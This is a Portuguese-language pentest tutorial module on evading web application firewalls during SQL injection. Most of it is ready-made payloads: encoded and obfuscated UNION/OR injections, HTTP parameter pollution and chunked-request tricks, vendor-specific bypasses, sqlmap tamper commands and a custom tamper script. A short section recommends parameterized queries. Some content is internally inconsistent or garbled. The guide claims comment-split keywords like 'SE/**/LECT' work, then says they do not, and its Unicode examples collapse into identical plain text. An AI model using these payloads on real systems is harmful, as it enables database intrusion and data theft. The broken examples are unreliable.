---
title: "SQLi WAF Bypass"
---

# SQLi WAF Bypass

## A Falha: WAF Inspeciona Representação Textual, Não Semântica SQL

A razão pela qual WAFs podem ser bypassados em SQL Injection está num problema fundamental de design: um WAF inspeciona a representação textual das requisições HTTP, mas o banco de dados interpreta a semântica SQL. Essas são duas camadas completamente diferentes, e o que parece "diferente" para o WAF pode ser "idêntico" para o banco.

O WAF detecta `SELECT` como string literal num payload. Mas o banco de dados entende que `SE/**/LECT`, `sElEcT`, `/*!SELECT*/` e `%53%45%4c%45%43%54` são todos a mesma instrução SQL. O WAF opera na representação; o banco opera no significado. Essa divergência é estrutural — não é uma falha de implementação específica de um WAF, é uma limitação inerente à abordagem de inspeção por assinatura textual.

A suposição de design errada nos WAFs é que "bloquear as palavras-chave SQL bloqueia SQL Injection". Isso só seria verdade se o SQL fosse um formato sem variações sintáticas — o que não é. SQL permite comentários inline, encoding de caracteres, variação de case, whitespace alternativo, e múltiplas formas de expressar a mesma operação. Cada uma dessas variações é semanticamente equivalente para o banco mas pode ser desconhecida para o WAF.

Para o pentest, entender WAF bypass é essencial porque a maioria dos alvos reais em produção está atrás de alguma proteção de WAF. Uma vulnerabilidade de SQLi confirmada via fonte (code review) ou em ambiente interno pode parecer "não explorável" na prática se o WAF bloquear os payloads padrão. Saber bypassar essa camada valida se a vulnerabilidade é realmente explorável e qual é o impacto real. Para o lado defensivo, entender como WAFs são bypassados permite construir proteções mais robustas — regras que inspecionam semântica em vez de apenas representação textual, e que são combinadas com parametrização correta no código.

---

## Causa Raiz dos Bypasses

Todo bypass de WAF explora a mesma lacuna: a diferença entre como o WAF interpreta o texto e como o banco de dados interpreta o SQL. Via encoding, o WAF vê `%53%45%4c%45%43%54` enquanto o banco decodifica e executa `SELECT`. Via variação de case, o WAF bloqueia `SELECT` mas o banco aceita `SeLeCt` porque SQL é case-insensitive. Via comentários, o WAF vê `SE/**/LECT` como fragmento desconhecido, mas o banco ignora o comentário e reconstrói o token completo. Via whitespace alternativo, o WAF espera espaço literal enquanto o banco aceita tab, newline ou carriage return. Via sintaxe alternativa, o WAF bloqueia `=` mas o banco executa equivalentemente com `LIKE`, `BETWEEN` ou `IN`.

O que está faltando no WAF é compreensão semântica — normalizar o input para sua forma canônica antes de inspecionar. Alguns WAFs de nova geração fazem isso parcialmente (normalização de URL encoding, por exemplo), mas raramente cobrem todas as variações de sintaxe SQL.

---

## Discovery

### Identificando a Presença de um WAF

#### 1. Headers de Resposta

```bash
curl -I https://target.com/page?id=1

# Headers indicativos de WAF:
# Server: cloudflare
# CF-RAY: 7a8b9c0d1e2f3456-GRU
# X-Cache: MISS
# X-Powered-By-Firewall: Imperva
# X-Sucuri-ID: 15001
# X-Barracuda-*: presente
```

Exemplos de headers por WAF:

| WAF | Header(s) |
|-----|-----------|
| Cloudflare | `Server: cloudflare`, `CF-RAY` |
| AWS WAF | `x-amzn-requestid`, `X-AMZ-*` |
| Imperva | `X-Iinfo`, `visid_incap_*` cookie |
| Akamai | `X-Check-Cacheable`, `Akamai-*` |
| Sucuri | `X-Sucuri-ID`, `X-Sucuri-Cache` |
| ModSecurity | Página de erro 403 com "ModSecurity" |
| Barracuda | `barra_counter_session` cookie |

#### 2. Fingerprinting pela Página de Erro

```bash
# Enviar um payload óbvio e analisar a página de erro
curl "https://target.com/?id=1' OR '1'='1"

# ModSecurity: Mostra "406 Not Acceptable" com mensagem genérica
# Cloudflare: Página de erro azul com "Attention Required!"
# Imperva: Página com "Request blocked" e ID de incidente
# AWS WAF: Página HTML genérica "403 Forbidden"
```

#### 3. Timing

```bash
# Requisição normal
time curl "https://target.com/?id=1"

# Requisição com payload simples
time curl "https://target.com/?id=1'"

# Diferença de tempo pode indicar processamento de WAF
# Cloudflare: ~50ms de overhead adicional
# Imperva: ~100-200ms para análise profunda
```

#### 4. Usando wafw00f

```bash
# Instalação
pip install wafw00f

# Detecção automática
wafw00f https://target.com

# Exemplo de saída
[*] Checking https://target.com
[+] The site https://target.com is behind Cloudflare (Cloudflare Inc.) WAF.
```

---

## Bypass de Proteções

### Categoria 1: Encoding

#### URL Encoding

```
# Original
' OR 1=1--

# URL Encoded (simples)
%27%20OR%201%3D1--

# Double URL Encoded
%2527%2520OR%25201%253D1--

# Triple URL Encoded (raro, mas possível)
%252527
```

#### HTML Entity Encoding

```
# Aspas simples
' → &#39; → &#x27;

# Em contexto HTML
<input value="&#39; OR 1=1--">
```

#### Unicode Encoding

```
# Aspas simples em Unicode
' → ' → %u0027

# Exemplos de bypass Unicode
SELECT → SELECT
```

#### Hex Encoding

```sql
-- Strings como hex em MySQL
SELECT 0x61646d696e  -- decodifica para 'admin'
SELECT CHAR(97,100,109,105,110)  -- também 'admin'

-- Contornar filtro de string literal
WHERE username = 0x61646d696e
```

### Categoria 2: Case Variation

Muitos WAFs fazem matching case-sensitive ou têm gaps na normalização:

```sql
-- Original (bloqueado)
SELECT * FROM users

-- Variações de case
sElEcT * fRoM uSeRs
SeLeCt * FrOm UsErS
UNION SELECT → uNiOn SeLeCt → UnIoN sElEcT

-- MySQL é case-insensitive por padrão
-- O WAF pode não ser!
```

### Categoria 3: Comment Injection

Comments no SQL são ignorados pelo parser mas podem confundir o WAF:

```sql
-- Inline comments C-style (MySQL, PostgreSQL)
SE/*comment*/LECT
UN/*bypass*/ION SEL/*waf*/ECT

-- Comentário de linha dupla hífen (SQL padrão)
SELECT--comment
1--
1-- -

-- Quebra de linha dentro de palavras-chave
SE-\nLECT  (usando newline real)
UN\nION

-- MySQL inline comment com número de versão
/*!SELECT*/
/*!50000SELECT*/  -- executa apenas em MySQL 5.0+
#!SELECT           -- bypass adicional

-- Combinações
/*!UNION*/ /*!SELECT*/
```

### Categoria 4: Whitespace Alternatives

WAFs frequentemente detectam espaços entre palavras-chave SQL. Substitua por:

| Substituto | Hex | Contexto |
|-----------|-----|---------|
| Tab | `%09` | URL |
| Newline | `%0a` | URL |
| Carriage Return | `%0d` | URL |
| Form Feed | `%0c` | URL |
| Vertical Tab | `%0b` | URL |
| Espaço não-breaking | `%a0` | URL (latin-1) |
| Comentários | `/**/` | SQL direto |

```sql
-- Uso de whitespace alternativo
SELECT/**/1/**/FROM/**/users
SELECT%09*%09FROM%09users
UNION%0aSELECT%0a1,2,3
SELECT%0d%0a*%0d%0aFROM%0d%0ausers

-- Parentheses (MySQL aceita em certos contextos)
SELECT(1)FROM(users)
```

### Categoria 5: Keyword Splitting

```sql
-- Usando concatenação para montar palavras-chave
-- (SQL Server, PostgreSQL, MySQL diferem na sintaxe)

-- Concatenação de strings para bypassar filtro de palavras
CONCAT('SEL','ECT')  -- não funciona para palavras-chave
                     -- mas funciona para strings em dados

-- Método eficaz: usar aliases e sub-selects
(SELECT 1)
((SELECT 1))

-- MySQL: inline comment quebra a palavra mas preserva função
SEL/**/ECT  -- NÃO funciona (comment dentro de keyword é ignorado)
```

### Categoria 6: Alternative Syntax

```sql
-- Usar funções ao invés de literais
-- Contornar filtro de string 'admin'
WHERE username = CHAR(97,100,109,105,110)
WHERE username = 0x61646d696e
WHERE username = UNHEX('61646d696e')

-- Comparações alternativas
-- Ao invés de =, usar LIKE, BETWEEN, IN
WHERE id LIKE 1
WHERE id BETWEEN 0 AND 2
WHERE id IN (1)

-- GREATEST/LEAST ao invés de comparação direta
WHERE GREATEST(id,1)=1

-- IF ao invés de OR/AND
WHERE IF(1=1, id, 0)=id
```

### Categoria 7: HTTP Parameter Pollution (HPP)

Alguns WAFs inspecionam apenas o primeiro valor de um parâmetro duplicado:

```
# GET request normal (bloqueado)
GET /page?id=1 UNION SELECT 1,2,3

# HPP - enviar o parâmetro duas vezes
GET /page?id=1&id=2 UNION SELECT 1,2,3

# O WAF vê apenas id=1 (seguro)
# O backend concatena ou usa o segundo valor
# Resultado depende da linguagem:
# PHP: usa o último valor
# ASP.NET: concatena com vírgula (1,2 UNION SELECT...)
# Flask: usa o primeiro valor

# HPP em POST
POST /login
username=admin&password=x&password=y UNION SELECT 1,2--
```

### Categoria 8: Chunked Transfer Encoding

O chunked encoding instrui o servidor a receber o body em "chunks" separados. Muitos WAFs não remontam o body antes de inspecionar, permitindo que payloads divididos passem:

```
POST /vulnerable HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Type: application/x-www-form-urlencoded

4
id=1
b
 UNION SELEC
6
T 1--
0

```

Extensão Burp: **chunked-coding-converter** ou usar turbo intruder.

### Categoria 9: Multipart/form-data

```python
import requests

# Payload dividido em múltiplas partes
files = {
    'id': (None, '1'),
    'id2': (None, ' UNION SELECT 1,2,3--')
}

r = requests.post('http://target.com/api', files=files)
```

### Categoria 10: Bypass na UNION

```sql
-- UNION com whitespace alternativo
1 UNION%0ASELECT 1,2,3
1 UNION%23%0ASELECT 1,2,3  -- %23 = #, %0A = newline

-- UNION sem espaço (parens)
1 UNION(SELECT 1,2,3)
1 UNION(SELECT(1),(2),(3))

-- MySQL inline comment
1 /*!UNION*/ /*!SELECT*/ 1,2,3

-- Obfuscação adicional
1/**/UNION/**/SELECT/**/1,2,3

-- Combinar técnicas
1%09UNION%0ASELECT%091,2,3
```

---

## Ferramentas

### sqlmap com Tamper Scripts

sqlmap inclui scripts de tamper prontos para bypassar WAFs. Cada script transforma o payload de uma forma específica:

| Script | Transformação | Exemplo |
|--------|--------------|---------|
| `space2comment` | Espaços → `/**/` | `SELECT/**/1/**/FROM/**/users` |
| `between` | `>` → `NOT BETWEEN 0 AND` | `id NOT BETWEEN 0 AND 1` |
| `randomcase` | Case aleatório | `SeLeCt` |
| `charunicode` | Unicode encode | `SELECT` |
| `hexentities` | Hex entities | `&#x53;&#x45;&#x4c;...` |
| `charencode` | URL encode | `%53%45%4c%45%43%54` |
| `symboliclogical` | AND/OR → &&/\|\| | `1 && 1` |
| `greatest` | `>` → `GREATEST()` | `GREATEST(id,1)=1` |
| `least` | `<` → `LEAST()` | `LEAST(id,9)=id` |
| `space2dash` | Espaços → `--` + newline | `SELECT--\nFROM` |
| `space2hash` | Espaços → `#` + newline | `SELECT#\nFROM` |
| `space2mssqlblank` | Espaços → chars em branco | `SELECT\t1` |
| `equaltolike` | `=` → `LIKE` | `WHERE username LIKE 'admin'` |
| `percentage` | Adiciona `%` entre chars | `S%E%L%E%C%T` (SQL Server) |
| `apostrophemask` | `'` → `%EF%BC%87` (UTF-8 fullwidth) | bypass de filtro de aspas |

```bash
# Usar um tamper script
sqlmap -u "http://target.com/page?id=1" \
       -p id \
       --tamper="space2comment"

# Combinar múltiplos tamper scripts
sqlmap -u "http://target.com/page?id=1" \
       -p id \
       --tamper="space2comment,between,randomcase"

# Tamper com delay para evitar bloqueio por rate limit
sqlmap -u "http://target.com/page?id=1" \
       -p id \
       --tamper="space2comment,between" \
       --delay=2 \
       --random-agent

# Para WAFs mais agressivos
sqlmap -u "http://target.com/page?id=1" \
       -p id \
       --tamper="charunicode,space2comment,between,randomcase" \
       --level=5 \
       --risk=3 \
       --random-agent \
       --timeout=30

# Identificar WAF antes de atacar
sqlmap -u "http://target.com/page?id=1" \
       --identify-waf

# Usar proxy para ver os payloads
sqlmap -u "http://target.com/page?id=1" \
       --tamper="space2comment" \
       --proxy="http://127.0.0.1:8080"
```

### Burp Repeater - Teste Manual

O processo de bypass manual no Burp:

1. Interceptar a requisição legítima
2. Identificar o parâmetro vulnerável
3. Enviar para o Repeater (Ctrl+R)
4. Testar um payload simples e observar a resposta do WAF
5. Aplicar técnicas de encoding/obfuscação gradualmente
6. Combinar técnicas até obter uma resposta SQL válida

```
# Fluxo de teste manual no Burp Repeater

Passo 1: Confirmar injeção sem WAF (se possível internamente)
GET /page?id=1' HTTP/1.1
→ Resposta: Erro SQL (500) = vulnerável

Passo 2: Confirmar que WAF existe
GET /page?id=1' HTTP/1.1
→ Resposta: 403 = WAF ativo

Passo 3: Testar encoding
GET /page?id=1%27 HTTP/1.1
→ 403? Tente double encoding: 1%2527

Passo 4: Testar whitespace alternativo
GET /page?id=1'%09OR%091=1-- HTTP/1.1
→ 403? Tente: 1'/**/OR/**/1=1--

Passo 5: Testar case variation
GET /page?id=1'%09oR%091=1-- HTTP/1.1
→ 200? Seguir com UNION

Passo 6: UNION com bypass
GET /page?id=1'%09UNION%0ASELECT%091,2,3-- HTTP/1.1
```

---

## Técnicas Avançadas de Bypass

### ModSecurity CRS (OWASP Core Rule Set)

```sql
-- ModSecurity detecta: UNION, SELECT, FROM, WHERE
-- Bypass com inline comment MySQL
1/*!UNION*//*!SELECT*/1,2,3--

-- Bypass com espaço + encoding
1%09UNION%0ASELECT%091,2,3%23

-- Bypass usando parentheses
1 UNION(SELECT(1),(2),(3))

-- Bypass combinado
1+UNION+ALL+SELECT+NULL,NULL,NULL--
```

### Cloudflare WAF

```sql
-- Cloudflare tem detecção muito robusta
-- Foco em encoding duplo e alternativas

-- Double URL encoding
1%2527%2520UNION%2520SELECT%2520NULL--

-- Unicode normalization bypass
1 ＵＮＩＯＮｓｅｌｅｃｔ NULL-- (Unicode fullwidth)

-- Chunked transfer encoding bypass
-- Use Burp extension "chunked-coding-converter"
```

### AWS WAF

```sql
-- AWS WAF tem regras gerenciadas por categoria
-- Bypass varia por conjunto de regras ativo

-- Comentário + case
1%09uNiOn%0aSelEcT%0anull,null--

-- Encoding hexadecimal
1 UNION SELECT 0x61,0x62,0x63--
```

### Imperva Incapsula

```sql
-- Imperva é particularmente rígido com UNION SELECT
-- Técnica: usar subquery ao invés de UNION

-- Em vez de UNION
1 AND (SELECT 1 FROM users LIMIT 1)=1

-- Boolean blind sem UNION
1 AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'

-- Time-based (contorna filtros de output)
1; IF(1=1, SLEEP(5), 0)--
```

---

## Bypass de Blacklists de Palavras-Chave

### SELECT

```sql
/*!SELECT*/           -- MySQL inline comment
SeLeCtI/*!*/oN        -- quebra com comment
%53%45%4c%45%43%54    -- URL encoded
SELECT  -- Unicode
```

### UNION

```sql
UN/**/ION            -- comment no meio (não funciona em todos os parsers)
/*!UNION*/           -- MySQL
%55%4e%49%4f%4e      -- URL encoded
UNION ALL            -- alguns WAFs bloqueiam UNION mas não UNION ALL
```

### FROM

```sql
FR/**/OM
/*!FROM*/
%46%52%4f%4d
```

### WHERE / AND / OR

```sql
-- Substituições para AND
&&                   -- equivalente em alguns contextos
%26%26               -- URL encoded

-- Substituições para OR
||                   -- equivalente
%7c%7c               -- URL encoded

-- WHERE pode ser substituído em alguns casos
HAVING               -- em contextos GROUP BY
```

---

## Detecção e Mitigação

### Como Detectar que Seu Bypass Funcionou

```
Resposta 403/406: WAF bloqueou → ajustar técnica
Resposta 500 com erro SQL: payload passou, query incorreta → continuar refinando
Resposta 200 normal: payload passou, aplicação tratou → verificar extração de dados
Resposta 200 com dados: SUCESSO!
```

### Automação de Detecção

```bash
# Criar um tamper script personalizado para um WAF específico
# Localização: /usr/share/sqlmap/tamper/

cat > /usr/share/sqlmap/tamper/mywafbypass.py << 'EOF'
#!/usr/bin/env python
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Transforma: SELECT → /*!SELECT*/
    Transforma: UNION → /*!UNION*/
    """
    import re
    keywords = ['SELECT', 'UNION', 'FROM', 'WHERE', 'AND', 'OR']
    for kw in keywords:
        payload = re.sub(kw, '/*!%s*/' % kw, payload, flags=re.IGNORECASE)
    return payload
EOF

# Usar o script customizado
sqlmap -u "http://target.com/?id=1" --tamper="mywafbypass"
```

### Por Que WAF Não É Solução Suficiente

A perspectiva defensiva correta é: WAF é uma camada de defesa em profundidade, não a solução principal. Um WAF bem configurado eleva o custo para o atacante — torna o bypass mais trabalhoso — mas não elimina a vulnerabilidade. A solução real para SQLi continua sendo a mesma: queries parametrizadas no código. Se a aplicação usa prepared statements corretamente, payloads SQL são inofensivos independente do WAF. O WAF deve existir como camada adicional, não como substituto para código seguro.

---

## Resumo de Payloads de Bypass

```bash
# ===== ENCODING =====
# URL simples
1'%20OR%201=1--
# Double URL
1%2527%2520OR%25201%253D1--
# Unicode
1' OR 1=1--

# ===== WHITESPACE BYPASS =====
1'/**/OR/**/1=1--
1'%09OR%091=1--
1'%0aOR%0a1=1--
1+OR+1=1--

# ===== UNION BYPASS =====
1 UNION%0ASELECT%091,2,3--
1 /*!UNION*/ /*!SELECT*/ 1,2,3--
1 UNION(SELECT(1),(2),(3))--
1%09UNION%0ASELECT%091,2,3%23

# ===== KEYWORD BYPASS =====
1' /*!OR*/ '1'='1
1' /*!50000OR*/ '1'='1
1' %55NION %53ELECT 1,2,3--

# ===== COMMENT INJECTION =====
1'--+-
1'#
1';--
1'/*bypass*/OR/*bypass*/'1'='1

# ===== CASE VARIATION =====
1' Or '1'='1
1' oR '1'='1
1' OR '1'='1

# ===== SQLMAP EXEMPLOS =====
sqlmap -u "URL" --tamper="space2comment,between"
sqlmap -u "URL" --tamper="randomcase,charencode"
sqlmap -u "URL" --tamper="space2comment,randomcase,charunicode"
```

---

## Módulos Relacionados

As técnicas de bypass descritas aqui se aplicam sobre os payloads fundamentais cobertos em [`01_sqli_fundamentos.md`](01_sqli_fundamentos.md) — entender o que os WAFs tentam bloquear requer conhecer os payloads originais. Para aplicar essas técnicas de forma automatizada via tamper scripts, ver [`03_sqlmap.md`](03_sqlmap.md). Em injeções NoSQL tratadas em [`04_nosql_injection.md`](04_nosql_injection.md), os WAFs têm ainda menos efetividade porque tipicamente não conhecem a sintaxe específica de cada banco NoSQL.
